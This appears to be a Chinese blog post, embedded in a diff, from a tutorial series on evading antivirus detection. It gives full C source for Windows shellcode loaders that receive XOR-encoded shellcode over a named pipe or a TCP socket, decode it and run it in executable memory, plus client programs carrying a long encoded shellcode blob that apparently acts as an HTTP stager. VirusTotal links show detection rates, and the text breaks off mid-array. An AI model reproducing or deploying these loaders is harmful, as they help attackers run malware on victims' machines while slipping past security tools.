+        <div class="post-meta">Nov 10, 2019</div>
+
+        <div class="post-excerpt">
+          <!--<h2 id="0x01-真正意义上的分离">0x01 真正意义上的分离</h2>
+
+<p>前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode</p>
+
+<p>将上一课的代码分离开编译，然后通过管道传输，让进程通信。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/61c9d3f728cda70fab2d1905d018df9f.png" alt="2019-11-10-02-08-49" /></p>
+
+<p>https://www.virustotal.com/gui/file/72db045fbb839a666a5cc2d13ea5a8282756014d80827a7343344e2d5387fe44/detection</p>
+
+<p>https://www.virustotal.com/gui/file/d31628050d943101ff108b9b070b48f97075e295e3797aec8ab8454cc19a3d88/detection</p>
+
+<p><strong>BadCodeWithPipe</strong></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;intrin.h&gt;
+</span>
+<span class="cp">#define BUFF_SIZE 1024
+</span>
+<span class="n">PTCHAR</span> <span class="n">ptsPipeName</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">pipe</span><span class="se">\\</span><span class="s">BadCodeTest"</span><span class="p">);</span>
+
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+
+    <span class="n">HANDLE</span> <span class="n">hPipe</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="n">CHAR</span> <span class="n">szBuffer</span><span class="p">[</span><span class="n">BUFF_SIZE</span><span class="p">];</span>
+    <span class="n">DWORD</span> <span class="n">dwLen</span><span class="p">;</span>
+    <span class="n">PCHAR</span> <span class="n">pszShellcode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span> <span class="c1">// 内存页属性</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span>
+    <span class="c1">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span>
+    <span class="n">hPipe</span> <span class="o">=</span> <span class="n">CreateNamedPipe</span><span class="p">(</span>
+        <span class="n">ptsPipeName</span><span class="p">,</span>
+        <span class="n">PIPE_ACCESS_INBOUND</span><span class="p">,</span>
+        <span class="n">PIPE_TYPE_BYTE</span><span class="o">|</span> <span class="n">PIPE_WAIT</span><span class="p">,</span>
+        <span class="n">PIPE_UNLIMITED_INSTANCES</span><span class="p">,</span>
+        <span class="n">BUFF_SIZE</span><span class="p">,</span>
+        <span class="n">BUFF_SIZE</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">hPipe</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">){</span>
+        <span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-]Create Pipe Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">ConnectNamedPipe</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span><span class="nb">NULL</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Client Connected...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">ReadFile</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span><span class="n">szBuffer</span><span class="p">,</span><span class="n">BUFF_SIZE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwLen</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Get DATA Length : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwLen</span><span class="p">);</span>
+        <span class="c1">// 申请内存页</span>
+        <span class="n">pszShellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="n">dwLen</span><span class="p">,</span><span class="n">MEM_COMMIT</span><span class="p">,</span><span class="n">PAGE_READWRITE</span><span class="p">);</span>
+        <span class="c1">// 拷贝内存</span>
+        <span class="n">CopyMemory</span><span class="p">(</span><span class="n">pszShellcode</span><span class="p">,</span><span class="n">szBuffer</span><span class="p">,</span><span class="n">dwLen</span><span class="p">);</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span> <span class="n">dwLen</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+            <span class="n">Sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span>
+            <span class="n">_InterlockedXor8</span><span class="p">(</span><span class="n">pszShellcode</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 这里开始更改它的属性为可执行</span>
+        <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">pszShellcode</span><span class="p">,</span><span class="n">dwLen</span><span class="p">,</span><span class="n">PAGE_EXECUTE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">);</span>
+        <span class="c1">// 执行Shellcode</span>
+        <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+            <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">pszShellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+            <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+        <span class="p">);</span>
+
+        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="n">INFINITE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>BadCodePipeClient</strong></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;intrin.h&gt;
+</span>
+<span class="cp">#define BUFF_SIZE 1024
+</span><span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a</span><span class="s">"</span><span class="p">;</span>
+<span class="n">PTCHAR</span> <span class="n">ptsPipeName</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">pipe</span><span class="se">\\</span><span class="s">BadCodeTest"</span><span class="p">);</span>
+
+
+<span class="n">BOOL</span> <span class="nf">RecvShellcode</span><span class="p">(</span><span class="n">VOID</span><span class="p">){</span>
+    <span class="n">HANDLE</span> <span class="n">hPipeClient</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwWritten</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwShellcodeSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+    <span class="c1">// 等待管道可用</span>
+    <span class="n">WaitNamedPipe</span><span class="p">(</span><span class="n">ptsPipeName</span><span class="p">,</span><span class="n">NMPWAIT_WAIT_FOREVER</span><span class="p">);</span>
+    <span class="c1">// 连接管道</span>
+    <span class="n">hPipeClient</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">ptsPipeName</span><span class="p">,</span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="n">FILE_SHARE_READ</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">OPEN_EXISTING</span> <span class="p">,</span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">hPipeClient</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Can't Open Pipe , Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">WriteFile</span><span class="p">(</span><span class="n">hPipeClient</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">dwShellcodeSize</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwWritten</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">dwWritten</span> <span class="o">==</span> <span class="n">dwShellcodeSize</span><span class="p">){</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipeClient</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Send Success ! Shellcode : %d Bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwShellcodeSize</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipeClient</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+
+    <span class="n">RecvShellcode</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="0x02-网络套接字socket">0x02 网络套接字（SOCKET）</h2>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1a40f881fa1acfbe75f302bfff33a013.png" alt="2019-11-10-02-09-50" /></p>
+
+<p>通过建立一个客户端和服务端，进行Shellcode的收发，类似于Java中的反序列化。</p>
+
+<p><strong>服务端</strong></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;WinSock2.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;intrin.h&gt;
+</span>
+<span class="cp">#pragma comment(lib,"ws2_32.lib")
+</span>
+<span class="n">BOOL</span> <span class="nf">RunCode</span><span class="p">(</span><span class="n">CHAR</span> <span class="o">*</span> <span class="n">code</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">dwCodeLen</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span>
+    <span class="n">PCHAR</span> <span class="n">pszShellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="n">dwCodeLen</span><span class="p">,</span><span class="n">MEM_COMMIT</span><span class="p">,</span><span class="n">PAGE_READWRITE</span><span class="p">);</span>
+    <span class="n">CopyMemory</span><span class="p">(</span><span class="n">pszShellcode</span><span class="p">,</span><span class="n">code</span><span class="p">,</span><span class="n">dwCodeLen</span><span class="p">);</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span> <span class="n">dwCodeLen</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+            <span class="n">_InterlockedXor8</span><span class="p">(</span><span class="n">pszShellcode</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">// 这里开始更改它的属性为可执行</span>
+        <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">pszShellcode</span><span class="p">,</span><span class="n">dwCodeLen</span><span class="p">,</span><span class="n">PAGE_EXECUTE</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">);</span>
+        <span class="c1">// 执行Shellcode</span>
+        <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+            <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">pszShellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+            <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+            <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+        <span class="p">);</span>
+        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="n">INFINITE</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="n">argv</span><span class="p">[]){</span>
+    <span class="n">CHAR</span> <span class="n">buf</span><span class="p">[</span><span class="mi">801</span><span class="p">];</span>
+    <span class="n">DWORD</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">sockVersion</span> <span class="o">=</span> <span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="n">WSADATA</span> <span class="n">wsaData</span><span class="p">;</span>
+    <span class="n">SOCKET</span> <span class="n">socks</span><span class="p">;</span>
+    <span class="n">SOCKET</span> <span class="n">sClient</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">s_client</span><span class="p">;</span>
+    <span class="n">INT</span> <span class="n">nAddrLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s_client</span><span class="p">);</span>
+    <span class="n">SHORT</span> <span class="n">sListenPort</span> <span class="o">=</span> <span class="mi">8888</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">WSAStartup</span><span class="p">(</span><span class="n">sockVersion</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wsaData</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*]WSAStarup Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">socks</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">socks</span> <span class="o">==</span> <span class="n">INVALID_SOCKET</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*]Socket Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">sListenPort</span><span class="p">);</span>
+    <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">S_un</span><span class="p">.</span><span class="n">S_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">socks</span><span class="p">,(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*]Bind Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">socks</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="n">SOCKET_ERROR</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dwError</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*]Listen  Error : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">dwError</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">dwError</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">sClient</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">socks</span><span class="p">,</span> <span class="p">(</span><span class="n">SOCKADDR</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s_client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nAddrLen</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">sClient</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Recv %d-Bytes </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">ret</span><span class="p">);</span>
+        <span class="n">closesocket</span><span class="p">(</span><span class="n">sClient</span><span class="p">);</span>
+        <span class="n">closesocket</span><span class="p">(</span><span class="n">socks</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">WSACleanup</span><span class="p">();</span>
+    <span class="n">RunCode</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/10b60659fff4172d335c0bc25608f8c0.png" alt="2019-11-10-02-10-24" /></p>
+
+<p>https://www.virustotal.com/gui/file/3dbef953e7bb0839d7abe9db7003bdad6ac7d7b0581ea7fd2b5131e79034e4b2/detection</p>
+
+<p><strong>客户端</strong></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;WinSock2.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;intrin.h&gt;
+</span>
+<span class="cp">#pragma comment(lib,"ws2_32.lib")
+</span><span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4